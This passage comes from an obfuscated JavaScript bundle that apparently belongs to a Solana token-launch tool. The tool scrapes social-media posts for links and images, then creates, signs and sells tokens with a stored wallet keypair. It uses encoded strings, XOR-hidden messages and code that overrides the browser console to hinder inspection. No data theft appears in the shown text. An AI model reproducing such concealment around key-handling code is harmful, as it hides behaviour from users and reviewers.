          const o = Array[dt(405)](t["querySelec" + dt(T)](ht[dt(B)]));
          for (const t of o)
            t.src && f[dt(C)](t[dt(E)].split(/[\(\\)]/)[0].trim());
          const i = Array[dt(x)](t[dt(P) + dt(T)](ht.cnfKZ));
          for (const t of i)
            t.poster && f[dt(O)](t[dt(R)][dt(M)](/[\(\\)]/)[0][dt(L)]());
        } else if (u) {
          l = ((null == (r = t[dt(N) + dt(D)]('a[href*="/posts/"]'))
            ? void 0
            : r[dt(U)]) || "")
            [dt(q)](/[\(\\)]/)[0]
            .trim();
          const e = null == (o = t[dt(P) + dt(422)](ht.aHqzr)) ? void 0 : o.src;
          e && (d = e.split(/[\(\\)]/)[0][dt(402)]());
          const n = Array.from(t.querySelectorAll(ht.MYCsY));
          for (const t of n)
            t[dt(z)] && f.push(t.src.split(/[\(\\)]/)[0][dt(L)]());
          const i = Array.from(t["querySelec" + dt(T)]("video"));
          for (const t of i)
            t.poster && f[dt(K)](t.poster[dt(408)](/[\(\\)]/)[0].trim());
        } else if (c) {
          l = (
            (null ==
            (i = t["querySelec" + dt(b)](dt(W) + dt(425) + dt(F) + dt(j)))
              ? void 0
              : i[dt(G)]) || ""
          )
            .split(/[\(\\)]/)[0]
            .trim();
          const e = null == (s = t[dt(437) + "tor"](ht.NKLsZ)) ? void 0 : s.src;
          e && (d = e[dt(V)](/[\(\\)]/)[0].trim());
          const n = Array.from(t.querySelectorAll(ht[dt(H)]));
          for (const t of n)
            t[dt(Z)] && f.push(t.src[dt(408)](/[\(\\)]/)[0].trim());
          const r = Array.from(t["querySelec" + dt(T)](dt(X)));
          for (const t of r)
            t.poster && f.push(t.poster[dt(J)](/[\(\\)]/)[0][dt(Y)]());
        }
        if (
          (!l &&
            (l =
              Array.from(t.querySelectorAll("a[href]"))
                [dt(Q)]((t) => t.href)
                [dt(396)](
                  (t) =>
                    /twitter\.com\/\w+\/status\/\d+/[dt(382)](t) ||
                    /truthsocial\.com\/@\w+\/posts\/\d+/[dt(382)](t) ||
                    /instagram\.com\/(p|reel|stories)\/[\w-]+/[dt(382)](t)
                ) || ""),
          0 === f.length)
        ) {
          const e = Array[dt(405)](t[dt($) + "torAll"]("img"));
          for (const t of e) {
            const e = t.src;
            /pbs\.twimg\.com\/(amplify_video_thumb|media|card_img)/[dt(382)](
              e
            ) && f.push(e);
          }
          if (ht[dt(tt)](f[dt(et)], 0)) {
            const e = Array[dt(nt)](t[dt(437) + dt(412)]("video"));
            for (const t of e) t.poster && f[dt(392)](t[dt(rt)]);
          }
        }
        if (!d) {
          const e = Array.from(t["querySelec" + dt(ot)]("img"));
          for (const t of e) {
            const e = t[dt(z)];
            if (/profile_images.+\.(png|jpg|jpeg|webp)/[dt(it)](e)) {
              d = e;
              break;
            }
          }
        }
        const h = Qg[dt(st) + "e"]()[dt(at) + "s"]();
        return {
          coinName: "",
          ticker: "",
          initialLiquidity:
            (null == h ? void 0 : h.defaultSol.toString()) || "1",
          twitterUrl: a ? l : "",
          websiteUrl: a ? "" : l,
          images: [...f, d][dt(ut)](Boolean),
          selectedImage: f[0] || d,
        };
      } catch (pt) {
        return (
          dt(ct),
          1,
          pt instanceof Error
            ? pt.message
            : ht.YksFd(typeof pt, ht.euGnq) ||
              (pt && "object" == typeof pt && JSON[dt(lt)](pt)),
          null
        );
      }
    };
  axiomVamp;
  const wy = Sy;
  function by() {
    const t = [
      "yNDXA3C",
      "vxnLCG",
      "uKvoCNe",
      "mtm2mJe3sgv3su9I",
      "ChvIBgLJs2v5",
      "mtK5nJG2mLzdr1virW",
      "BwLUDa",
      "BNnHy3rPB24",
      "BMfTzq",
      "wff2BvO",
      "C3rYAw5N",
      "vw5PDfbYAwnL",
      "BhKGC29Szca",
      "C2v0q29TChv0zq",
      "z2v0sw5ZDgfUyW",
      "yw1VDw50",
      "yu9kr00",
      "igjHBgfUy2uVDa",
      "x19WCM90B19F",
      "mJy1mJaWv1rmt25t",
      "ihrVigHHDMuG",
      "CM4GDgHPCYiPka",
      "uKfXB1y",
      "DgLVBG",
      "zvvUAxrZ",
      "zgvJB2rL",
      "z2v0u2v0DgLUzW",
      "BNqGyMfSyw5Jzq",
      "rfjUBuO",
      "nwrOuuHrra",
      "yM9UzgLUz0n1CG",
      "C2TPCfbYzwzSAq",
      "q29PBIbJCMvHDa",
      "BwLJCM9myw1WBW",
      "BxnN",
      "AxnvC2vYqxv0Aa",
      "DxjP",
      "B21TAxrTzw50",
      "DxnLCG",
      "CMv0DxjUicHMDq",
      "Aw9UigzHAwXLza",
      "BgvUz3rO",
      "sw5ZDwzMAwnPzq",
      "vg5Svg8",
      "BgfUy2u",
      "z2v0uNbJq2XPzq",
      "mJu0ndCWne9VtwfXBG",
      "z2v0qwnJB3vUDa",
      "tM90igvUB3vNAa",
      "AxnAzxjV",
      "ywrK",
      "BMP3sgG",
      "C3rYAw5NAwz5",
      "Aw5PDgLHBeXPCq",
      "DwLKAxr5",
      "C2vUzfjHD1rYyq",
      "lIbzB3uGBMvLza",
      "A2HHC2G",
      "mty4ndK0nZbor3rUswy",
      "ihrOAxmGDg9Rzq",
      "CMvtDgf0DxnLCW",
      "C2XPChbHz2u",
      "mJe4CK9SwgTf",
      "Egvevhy",
      "yMLUza",
      "ChvTCa",
      "C2vYAwfSAxPL",
      "C29Sqw1VDw50vq",
      "z2v0qMfSyw5Jzq",
      "DgLJA2vY",
      "z2v0q29UBMvJDa",
      "yNv5sw5ZDhj1yW",
      "zMv0y2HcB25KAq",
      "yxbWBhK",
      "sw5MBW",
      "Bg9JA0HLAwDODa",
      "DLvczw8",
      "z2v0u0rl",
      "u2vSBgLUzYbMyq",
      "C2TdCNLWDa",
      "z2v0s2v5ugfPCG",
      "zgL2BG",
      "wvzkCe8",
      "BgfZDfzHBgLKqG",
      "Dg9tDhjPBMC",
      "ndaXntKYnMrmC3zvvq",
      "Bwf4uMv0CMLLCW",
      "z2v0vg9Rzw5byW",
      "ChjPB3jPDhLgzq",
      "z2vUzxjHDgvlzq",
      "C3vJy2vZCW",
      "mJm1nZDeExPoBgq",
      "odfXqLftDuu",
      "DMfSDwu",
      "y3rPB25Z",
    ];
    return (by = function () {
      return t;
    })();
  }
  !(function (t) {
    const e = 104,
      n = 163,
      r = 192,
      o = 147,
      i = 106,
      s = Sy,
      a = t();
    for (; []; )
      try {
        if (
          626482 ===
          parseInt(s(e)) / 1 +
            (parseInt(s(n)) / 2) * (parseInt(s(r)) / 3) +
            parseInt(s(o)) / 4 +
            (-parseInt(s(130)) / 5) * (-parseInt(s(186)) / 6) +
            -parseInt(s(i)) / 7 +
            (parseInt(s(120)) / 8) * (parseInt(s(193)) / 9) +
            -parseInt(s(159)) / 10
        )
          break;
        a.push(a.shift());
      } catch (u) {
        a.push(a.shift());
      }
  })(by);
  const vy = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n[Sy(174)](e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    Ay = vy(void 0, function () {
      const t = Sy,
        e = {};
      e[t(177)] = "(((.+)+)+)+$";
      const n = e;
      return Ay[t([185][0])]()
        .search("(((.+)+)+)+$")
        .toString()
        .constructor(Ay)
        .search(n.vUBeo);
    });
  Ay();
  const ky = (function () {
    let t = !![];
    return function (e, n) {
      const r = t
        ? function () {
            if (n) {
              const t = n.apply(e, arguments);
              return (n = null), t;
            }
          }
        : function () {};
      return (t = ![]), r;
    };
  })();
  ky(void 0, function () {
    const t = 103,
      e = 119,
      n = 185,
      r = 165,
      o = 140,
      i = Sy,
      s = {
        BlKLp: function (t, e) {
          return t(e);
        },
        SmVvE: function (t, e) {
          return t + e;
        },
        eiLYe: '{}.constructor("retu' + i(122) + " )",
        uhYva: "log",
        PsTdZ: "warn",
        NjyNs: "table",
        RENrq: "trace",
      },
      a = (function () {
        const t = i;
        let e;
        try {
          e = s.BlKLp(Function, s.SmVvE(t(o) + "nction() " + s.eiLYe, ");"))();
        } catch (n) {
          e = window;
        }
        return e;
      })(),
      u = (a.console = a.console || {}),
      c = [s.uhYva, s.PsTdZ, "info", "error", "exception", s.NjyNs, s[i(t)]];
    for (let l = 0; l < c.length; l++) {
      const t = ky.constructor.prototype.bind(ky),
        o = c[l],
        s = u[o] || t;
      (t[i(e)] = ky.bind(ky)), (t.toString = s[i(n)][i(r)](s)), (u[o] = t);
    }
  })(),
    (window[wy(180)] = function (t) {
      return function () {
        return t;
      };
    });
  const Iy = {
    priorityFeeUnits: new Jn.BN(1e7),
    solAmountUnits: new Jn.BN(0),
    slippage: 25,
  };
  function Sy(t, e) {
    const n = by();
    return (
      (Sy = function (e, r) {
        let o = n[(e -= 100)];
        if (void 0 === Sy.XJqktY) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (Sy.ScvRRO = i), (t = arguments), (Sy.XJqktY = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.gowKXW = t),
              (this.AeeJBq = [1, 0, 0]),
              (this.BcPHlW = function () {
                return "newState";
              }),
              (this.PZhVbb = "\\w+ *\\(\\) *{\\w+ *"),
              (this.DAZvuV = "['|\"].+['|\"];? *}");
          };
          (e.prototype.ekDcKS = function () {
            const t = new RegExp(this.PZhVbb + this.DAZvuV).test(
              this.BcPHlW.toString()
            )
              ? --this.AeeJBq[1]
              : --this.AeeJBq[0];
            return this.HZgYyb(t);
          }),
            (e.prototype.HZgYyb = function (t) {
              return Boolean(~t) ? this.avIYIp(this.gowKXW) : t;
            }),
            (e.prototype.avIYIp = function (t) {
              for (let e = 0, n = this.AeeJBq.length; e < n; e++)
                this.AeeJBq.push(Math.round(Math.random())),
                  (n = this.AeeJBq.length);
              return t(this.AeeJBq[0]);
            }),
            new e(Sy).ekDcKS(),
            (o = Sy.ScvRRO(o)),
            (t[s] = o);
        }
        return o;
      }),
      Sy(t, e)
    );
  }
  function _y(t) {
    const e = wy,
      n = {
        njwHh: function (t, e) {
          return t(e);
        },
        FgGPY: function (t, e) {
          return t * e;
        },
        GehGR: function (t, e) {
          return t * e;
        },
        IOmdb: function (t, e) {
          return t / e;
        },
      },
      r = n.njwHh(BigInt, 1e9),
      o = BigInt(45e4),
      i = Math.ceil(n.FgGPY(t, 1e6)),
      s = n.GehGR(BigInt(i), r) / BigInt(1e6),
      a = n.IOmdb(s * n[e(152)](BigInt, 1e6), o);
    return new Jn.BN(a);
  }
  window.Buffer = window.Buffer || dt;
  const Ty = async (t, e, n, r, o) => {
      const i = 114,
        s = 112,
        a = 109,
        u = 170,
        c = 137,
        l = 105,
        d = 168,
        f = 150,
        h = 131,
        p = 148,
        m = 105,
        g = 183,
        y = 139,
        w = 102,
        b = 116,
        v = 162,
        A = 172,
        k = 124,
        I = 151,
        S = 176,
        _ = 158,
        T = 167,
        B = 108,
        C = 194,
        E = 101,
        x = 142,
        P = 135,
        O = 133,
        R = 133,
        M = 141,
        L = 111,
        N = 191,
        D = wy,
        U = {
          YVJpO: function (t, e, n, r) {
            return t(e, n, r);
          },
          JQuoh: function (t, e, n, r, o) {
            return t(e, n, r, o);
          },
          bwqkw: function (t, e) {
            return t === e;
          },
          MbDdO: function (t, e) {
            return t !== e;
          },
          WmeMv: function (t, e) {
            return t === e;
          },
        };
      try {
        const R = await n.fetchGlobal(),
          M = new As(),
          L = { units: 45e4 };
        M.add($u[D(i) + "UnitLimit"](L));
        const N = {};
        (N[D(134) + "rts"] = Iy.priorityFeeUnits),
          M.add($u["setCompute" + D(s)](N));
        const q = {};
        (q[D(107)] = r.publicKey),
          (q[D(a)] = t.name),
          (q.symbol = t[D(u)]),
          (q[D(c)] = t.uri),
          (q.creator = o[D(l)]),
          (q[D(139)] = o.publicKey);
        const z = await n.createInstruction(q);
        if ((M.add(z), !Iy[D(d) + "nits"][D(f)]())) {
          const t = n[D(h) + "vePda"](r[D(105)]);
          if (t) {
            const r = await e[D(p) + "Info"](t);
            if (r && r.data[D(142)] < 150) {
              const e = {};
              (e.account = t), (e.user = o.publicKey);
              const r = await n["extendAccountInstruc" + D(124)](e);
              M.add(r);
            }
          }
          const i = U[D(183)](ml, r.publicKey, o.publicKey, !![]),
            s = U.JQuoh(Al, o[D(l)], i, o[D(m)], r[D(m)]);
          M.add(s);
          const a = U[D(g)](lg, R, null, Iy.solAmountUnits),
            u = {};
          (u.global = R),
            (u.mint = r[D(l)]),
            (u.creator = o.publicKey),
            (u[D(y)] = o[D(l)]),
            (u["associated" + D(w)] = i),
            (u[D(b)] = a),
            (u.solAmount = Iy.solAmountUnits),
            (u[D(v)] = Iy[D(v)]);
          const c = await n[D(A) + D(k)](u);
          M[D(I)](c);
        }
        const { hash: K, lastValidHeight: W } = await VO(e),
          F = [o, r];
        (M["lastValidB" + D(S)] = W),
          (M["recentBloc" + D(_)] = K),
          M.sign(...F);
        const j = M[D(T)](),
          G = { skipPreflight: !![] };
        (G[D(187)] = 0), (G["preflightC" + D(138)] = "confirmed");
        const V = await e["sendRawTra" + D(B)](j, G),
          H = (await e["getSignatu" + D(161)]([V]))[D(C)][0],
          Z =
            H &&
            U[D(E)](H.err, null) &&
            0 !== V[D(x)] &&
            void 0 !== V &&
            "undefined" !== V &&
            U.MbDdO(V, null),
          X = {};
        return (
          (X[D(P)] = Z
            ? D(O) + "ed successfully"
            : D(149) + D(118) + "oo low SOL amount"),
          (X.success = Z),
          X
        );
      } catch (q) {
        let t = D(R) + D(M);
        q instanceof Error
          ? (t = q.message)
          : U.WmeMv(typeof q, D(L))
          ? (t = q)
          : q && "object" == typeof q && (t = JSON[D(153)](q));
        const e = {};
        return (e.msg = t), (e[D(N)] = ![]), e;
      }
    },
    By = async (t) => {
      var e;
      const n = 115,
        r = 127,
        o = 115,
        i = 181,
        s = 178,
        a = 142,
        u = 126,
        c = wy,
        l = {
          jZsRn: function (t, e) {
            return t & e;
          },
          JwaRG: function (t, e) {
            return t < e;
          },
        };
      (l[c(129)] = function (t, e) {
        return t & e;
      }),
        (l.QOuhI = function (t, e) {
          return t * e;
        }),
        (l.Zihad = function (t, e) {
          return t % e;
        });
      const d = l,
        f = Yg.getInstance();
      if (!f[c(136) + "enticated"]())
        return {
          msg: (function () {
            let t;
            return function () {
              const e = Sy;
              if (!t) {
                const n = new Uint8Array([
                    108, 95, 201, 189, 25, 69, 223, 239, 87, 67, 216, 239, 88,
                    89, 216, 167, 92, 66, 216, 166, 90, 77, 216, 170, 93,
                  ]),
                  r = -810800071,
                  o = new Uint8Array(n[e(a)]);
                for (let t = 0; t < n.length; t++) {
                  const e = (r >>> ((t % 4) * 8)) & 255;
                  o[t] = n[t] ^ e;
                }
                t = new TextDecoder()[e(u)](o);
              }
              return t;
            };
          })()(),
          success: ![],
        };
      Qg[c(n) + "e"]()[c(r) + "s"]();
      const h = $g[c(o) + "e"](),
        p = h.getWallet();
      if (!p)
        return {
          msg: (function () {
            const t = 126;
            let e;
            return function () {
              const n = Sy;
              if (!e) {
                const r = new Uint8Array([
                    98, 67, 217, 239, 85, 73, 201, 171, 27, 88, 195, 239, 88,
                    67, 194, 161, 94, 79, 216, 239, 66, 67, 217, 189, 27, 91,
                    205, 163, 87, 73, 216,
                  ]),
                  o = -810800069,
                  i = new Uint8Array(r.length);
                for (let t = 0; t < r.length; t++) {
                  const e = d.jZsRn(o >>> ((t % 4) * 8), 255);
                  i[t] = r[t] ^ e;
                }
                e = new TextDecoder()[n(t)](i);
              }
              return e;
            };
          })()(),
          success: ![],
        };
      let m = h[c(i)]();
      if (!h.hasKeyPair() || !m)
        return {
          msg: (function () {
            const t = 142,
              e = 126;
            let n;
            return function () {
              const r = Sy;
              if (!n) {
                const o = new Uint8Array([
                    122, 67, 217, 163, 93, 12, 194, 160, 77, 12, 202, 166, 87,
                    72, 140, 187, 86, 71, 201, 161, 23, 2, 147,
                  ]),
                  i = -810800071,
                  s = new Uint8Array(o.length);
                for (let e = 0; d.JwaRG(e, o[r(t)]); e++) {
                  const t = d.DRnmJ(i >>> d.QOuhI(d.Zihad(e, 4), 8), 255);
                  s[e] = o[e] ^ t;
                }
                n = new TextDecoder()[r(e)](s);
              }
              return n;
            };
          })()(),
          success: ![],
        };
      const g = f[c(s)](),
        y = f[c(171) + "ion"](),
        { msg: w, success: b } = await (async (t, e, n, r, o) => {
          const i = 105,
            s = 188,
            a = 182,
            u = 135,
            c = 160,
            l = 175,
            d = 105,
            f = 114,
            h = 100,
            p = 184,
            m = 158,
            g = 138,
            y = 144,
            w = 145,
            b = 113,
            v = 179,
            A = 117,
            k = 153,
            I = 191,
            S = wy,
            _ = {
              XQvmZ: function (t, e, n) {
                return t(e, n);
              },
              RneWj: function (t, e) {
                return t(e);
              },
              TnlTo: function (t, e) {
                return t !== e;
              },
              Mbejf: function (t, e) {
                return t !== e;
              },
              aOJGM: "object",
            };
          try {
            const v = _[S(110)](ml, r[S(i)], n[S(105)]),
              A = await t[S(s) + "countBalance"](v),
              k = new Jn.BN(A[S(194)].amount).muln(o)[S(a)](100);
            if (k.isZero()) {
              const t = {};
              return (
                (t[S(u)] = "You don't own any of" + S(c) + "n"),
                (t.success = ![]),
                t
              );
            }
            const I = await e.fetchGlobal(),
              T = e.bondingCurvePda(r.publicKey),
              [B, C] = await Promise.all([
                t["getAccount" + S(l)](T),
                e[S(173) + "ngCurve"](r[S(d)]),
              ]),
              E = dg(I, C, k),
              x = new As(),
              P = { units: 45e4 };
            x.add($u[S(f) + "UnitLimit"](P));
            const O = {};
            (O[S(134) + "rts"] = Iy.priorityFeeUnits),
              x.add($u.setComputeUnitPrice(O));
            const R = {};
            (R.global = I),
              (R[S(131) + "veAccountInfo"] = B),
              (R.bondingCurve = C),
              (R.mint = r[S(105)]),
              (R[S(139)] = n.publicKey),
              (R.amount = k),
              (R.solAmount = E),
              (R.slippage = Iy.slippage);
            const M = await e["sellInstru" + S(h)](R);
            x.add(...M);
            const { hash: L, lastValidHeight: N } = await _.RneWj(VO, t),
              D = [n];
            (x[S(p) + "lockHeight"] = N),
              (x["recentBloc" + S(m)] = L),
              x.sign(...D);
            const U = x[S(167)](),
              q = {};
            (q[S(132) + "ght"] = !![]),
              (q.maxRetries = 0),
              (q["preflightC" + S(g)] = "confirmed");
            const z = await t[S(156) + "nsaction"](U, q),
              K =
                _[S(y)](z.length, 0) &&
                _.Mbejf(z, void 0) &&
                _.Mbejf(z, "undefined") &&
                null !== z,
              W = {};
            return (
              (W.msg = K
                ? "Slippage too low/not enough ba" + S(w)
                : "Successful" + S(b) + o + "% of tokens"),
              (W.success = K),
              W
            );
          } catch (T) {
            let t = S(v) + "iled";
            T instanceof Error
              ? (t = T.message)
              : "string" == typeof T
              ? (t = T)
              : T && typeof T === _[S(A)] && (t = JSON[S(k)](T));
            const e = {};
            return (e[S(u)] = t), (e[S(I)] = ![]), e;
          }
        })(y, g, p, m, t);
      await (null == (e = Lg[c(146) + "nt"]())
        ? void 0
        : e.getBalance(p.publicKey));
      const v = {};
      return (v.msg = w), (v.success = b), v;
    },
    Cy = async (t, e) => {
      var n, r;
      const o = 115,
        i = 125,
        s = 169,
        a = 189,
        u = 135,
        c = 143,
        l = 128,
        d = 155,
        f = 191,
        h = 123,
        p = 171,
        m = 105,
        g = 142,
        y = 126,
        w = wy,
        b = {
          SSKbT: function (t, e) {
            return t * e;
          },
          PUILV: function (t, e) {
            return t < e;
          },
          xeDTv: function (t, e) {
            return t >>> e;
          },
          dwEpk: function (t, e) {
            return t % e;
          },
          pBYzp: function (t, e) {
            return t(e);
          },
          dPHbF: function (t, e) {
            return t(e);
          },
          RAqoV: w(166),
          GJqzA: function (t, e, n, r, o, i) {
            return t(e, n, r, o, i);
          },
        };
      if (e)
        return {
          msg: (function () {
            let t;
            return function () {
              if (!t) {
                const e = new Uint8Array([
                    114, 89, 192, 187, 86, 12, 200, 170, 79, 64, 195, 182, 31,
                    69, 223, 239, 92, 67, 193, 166, 81, 75, 140, 188, 80, 67,
                    194, 238,
                  ]),
                  n = -810800065,
                  r = new Uint8Array(e.length);
                for (let t = 0; t < e.length; t++) {
                  const o = (n >>> b.SSKbT(t % 4, 8)) & 255;
                  r[t] = e[t] ^ o;
                }
                t = new TextDecoder().decode(r);
              }
              return t;
            };
          })()(),
          success: ![],
        };
      const v = Yg[w(115) + "e"]();
      if (!v.isUserAuthenticated())
        return {
          msg: (function () {
            let t;
            return function () {
              const e = Sy;
              if (!t) {
                const n = new Uint8Array([
                    108, 95, 201, 189, 25, 66, 195, 187, 25, 77, 217, 187, 81,
                    73, 194, 187, 80, 79, 205, 187, 92, 72,
                  ]),
                  r = -810800071,
                  o = new Uint8Array(n.length);
                for (let t = 0; t < n[e(g)]; t++) {
                  const e = (r >>> ((t % 4) * 8)) & 255;
                  o[t] = n[t] ^ e;
                }
                t = new TextDecoder()[e(y)](o);
              }
              return t;
            };
          })()(),
          success: ![],
        };
      const A = $g[w(o) + "e"](),
        k = A.getWallet();
      if (!k)
        return {
          msg: (function () {
            const t = 142,
              e = 126,
              n = {
                lJHio: function (t, e) {
                  return t & e;
                },
              },
              r = n;
            let o;
            return function () {
              const n = Sy;
              if (!o) {
                const i = new Uint8Array([
                    117, 67, 140, 184, 90, 64, 192, 170, 79, 12, 200, 170, 79,
                    73, 207, 187, 94, 72,
                  ]),
                  s = -810800069,
                  a = new Uint8Array(i[n(142)]);
                for (let e = 0; e < i[n(t)]; e++) {
                  const t = r.lJHio(s >>> ((e % 4) * 8), 255);
                  a[e] = i[e] ^ t;
                }
                o = new TextDecoder()[n(e)](a);
              }
              return o;
            };
          })()(),
          success: ![],
        };
      const I = Qg[w(o) + "e"]().getSettings();
      I &&
        ((Iy["priorityFe" + w(i)] = b.pBYzp(_y, I.priorityFee)),
        (Iy.slippage = I.slippage)),
        (Iy.solAmountUnits =
          b.dPHbF(parseFloat, t.initialLiquidity) > 0
            ? new Jn.BN(1e9 * parseFloat(t.initialLiquidity))
            : new Jn.BN(0));
      const S = await (null == (n = Lg.getRpcClient())
        ? void 0
        : n[w(s)](k.publicKey));
      if (
        !S ||
        S <
          parseFloat(t[w(154) + "uidity"]) +
            (null == I ? void 0 : I[w(a) + "e"]) +
            0.03
      ) {
        const e = {};
        return (
          (e[w(u)] =
            w(c) +
            w(l) +
            w(157) +
            w(121) +
            t["initialLiq" + w(d)] +
            " + 0.03 SOL"),
          (e[w(f)] = ![]),
          e
        );
      }
      let _ = A[w(190) + "yPair"]();
      const T = await JO(t, b[w(h)]);
      if (!T)
        return {
          msg: (function () {
            const t = 164,
              e = 126;
            let n;
            return function () {
              const r = Sy;
              if (!n) {
                const o = new Uint8Array([
                    127, 77, 197, 163, 92, 72, 140, 187, 86, 12, 220, 189, 92,
                    92, 205, 189, 92, 12, 216, 160, 82, 73, 194, 239, 93, 77,
                    216, 174,
                  ]),
                  i = -810800071,
                  s = new Uint8Array(o.length);
                for (let e = 0; b.PUILV(e, o.length); e++) {
                  const n = 255 & b[r(t)](i, 8 * b.dwEpk(e, 4));
                  s[e] = o[e] ^ n;
                }
                n = new TextDecoder()[r(e)](s);
              }
              return n;
            };
          })()(),
          success: ![],
        };
      const B = v.getSDK(),
        C = v[w(p) + "ion"](),
        { msg: E, success: x } = await b.GJqzA(Ty, T, C, B, _, k);
      await (null == (r = Lg.getRpcClient()) ? void 0 : r.getBalance(k[w(m)]));
      const P = {};
      return (P[w(135)] = E), (P.success = x), P;
    };
  axiomVamp,
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  var Ey,
    xy,
    Py = { exports: {} },
    Oy = (Py.exports = {});
  function Ry() {
    throw new Error("setTimeout has not been defined");
  }
  function My() {
    throw new Error("clearTimeout has not been defined");
  }
  function Ly(t) {
    if (Ey === setTimeout) return setTimeout(t, 0);
    if ((Ey === Ry || !Ey) && setTimeout)
      return (Ey = setTimeout), setTimeout(t, 0);
    try {
      return Ey(t, 0);
    } catch (e) {
      try {
        return Ey.call(null, t, 0);
      } catch (n) {
        return Ey.call(this, t, 0);
      }
    }
  }
  !(function () {
    try {
      Ey = "function" == typeof setTimeout ? setTimeout : Ry;
    } catch (t) {
      Ey = Ry;
    }
    try {
      xy = "function" == typeof clearTimeout ? clearTimeout : My;
    } catch (t) {
      xy = My;
    }
  })();
  var Ny,
    Dy = [],
    Uy = !1,
    qy = -1;
  function zy() {
    Uy &&
      Ny &&
      ((Uy = !1),
      Ny.length ? (Dy = Ny.concat(Dy)) : (qy = -1),
      Dy.length && Ky());
  }
  function Ky() {
    if (!Uy) {
      var t = Ly(zy);
      Uy = !0;
      for (var e = Dy.length; e; ) {
        for (Ny = Dy, Dy = []; ++qy < e; ) Ny && Ny[qy].run();
        (qy = -1), (e = Dy.length);
      }
      (Ny = null),
        (Uy = !1),
        (function (t) {
          if (xy === clearTimeout) return clearTimeout(t);
          if ((xy === My || !xy) && clearTimeout)
            return (xy = clearTimeout), clearTimeout(t);
          try {
            return xy(t);
          } catch (e) {
            try {
              return xy.call(null, t);
            } catch (n) {
              return xy.call(this, t);
            }
          }
        })(t);
    }
  }
  function Wy(t, e) {
    (this.fun = t), (this.array = e);
  }
  function Fy() {}
  (Oy.nextTick = function (t) {
    var e = new Array(arguments.length - 1);
    if (arguments.length > 1)
      for (var n = 1; n < arguments.length; n++) e[n - 1] = arguments[n];
    Dy.push(new Wy(t, e)), 1 !== Dy.length || Uy || Ly(Ky);
  }),
    (Wy.prototype.run = function () {
      this.fun.apply(null, this.array);
    }),
    (Oy.title = "browser"),
    (Oy.browser = !0),
    (Oy.env = {}),
    (Oy.argv = []),
    (Oy.version = ""),
    (Oy.versions = {}),
    (Oy.on = Fy),
    (Oy.addListener = Fy),
    (Oy.once = Fy),
    (Oy.off = Fy),
    (Oy.removeListener = Fy),
    (Oy.removeAllListeners = Fy),
    (Oy.emit = Fy),
    (Oy.prependListener = Fy),
    (Oy.prependOnceListener = Fy),
    (Oy.listeners = function (t) {
      return [];
    }),
    (Oy.binding = function (t) {
      throw new Error("process.binding is not supported");
    }),
    (Oy.cwd = function () {
      return "/";
    }),
    (Oy.chdir = function (t) {
      throw new Error("process.chdir is not supported");
    }),
    (Oy.umask = function () {
      return 0;
    });
  const jy = (function (t) {
    return t &&
      t.__esModule &&
      Object.prototype.hasOwnProperty.call(t, "default")
      ? t.default
      : t;
  })(Py.exports);
  function Gy(t, e) {
    return function () {
      return t.apply(e, arguments);
    };
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const { toString: Vy } = Object.prototype,
    { getPrototypeOf: Hy } = Object,
    { iterator: Zy, toStringTag: Xy } = Symbol,
    Jy = ((t) => (e) => {
      const n = Vy.call(e);
      return t[n] || (t[n] = n.slice(8, -1).toLowerCase());
    })(Object.create(null)),
    Yy = (t) => ((t = t.toLowerCase()), (e) => Jy(e) === t),
    Qy = (t) => (e) => typeof e === t,
    { isArray: $y } = Array,
    tw = Qy("undefined");
  const ew = Yy("ArrayBuffer");
  const nw = Qy("string"),
    rw = Qy("function"),
    ow = Qy("number"),
    iw = (t) => null !== t && "object" == typeof t,
    sw = (t) => {
      if ("object" !== Jy(t)) return !1;
      const e = Hy(t);
      return !(
        (null !== e &&
          e !== Object.prototype &&
          null !== Object.getPrototypeOf(e)) ||
        Xy in t ||
        Zy in t
      );
    },
    aw = Yy("Date"),
    uw = Yy("File"),
    cw = Yy("Blob"),
    lw = Yy("FileList"),
    dw = Yy("URLSearchParams"),
    [fw, hw, pw, mw] = ["ReadableStream", "Request", "Response", "Headers"].map(
      Yy
    );
  function gw(t, e, { allOwnKeys: n = !1 } = {}) {
    if (null == t) return;
    let r, o;
    if (("object" != typeof t && (t = [t]), $y(t)))
      for (r = 0, o = t.length; r < o; r++) e.call(null, t[r], r, t);
    else {
      const o = n ? Object.getOwnPropertyNames(t) : Object.keys(t),
        i = o.length;
      let s;
      for (r = 0; r < i; r++) (s = o[r]), e.call(null, t[s], s, t);
    }
  }
  function yw(t, e) {
    e = e.toLowerCase();
    const n = Object.keys(t);
    let r,
      o = n.length;
    for (; o-- > 0; ) if (((r = n[o]), e === r.toLowerCase())) return r;
    return null;
  }
  const ww =
      "undefined" != typeof globalThis
        ? globalThis
        : "undefined" != typeof self
        ? self
        : "undefined" != typeof window
        ? window
        : Tl,
    bw = (t) => !tw(t) && t !== ww;
  const vw = (
      (t) => (e) =>
        t && e instanceof t
    )("undefined" != typeof Uint8Array && Hy(Uint8Array)),
    Aw = Yy("HTMLFormElement"),
    kw = (
      ({ hasOwnProperty: t }) =>
      (e, n) =>
        t.call(e, n)
    )(Object.prototype),
    Iw = Yy("RegExp"),
    Sw = (t, e) => {
      const n = Object.getOwnPropertyDescriptors(t),
        r = {};
      gw(n, (n, o) => {
        let i;
        !1 !== (i = e(n, o, t)) && (r[o] = i || n);
      }),
        Object.defineProperties(t, r);
    };
  const _w = Yy("AsyncFunction"),
    Tw =
      ((Bw = "function" == typeof setImmediate),
      (Cw = rw(ww.postMessage)),
      Bw
        ? setImmediate
        : Cw
        ? ((Ew = `axios@${Math.random()}`),
          (xw = []),
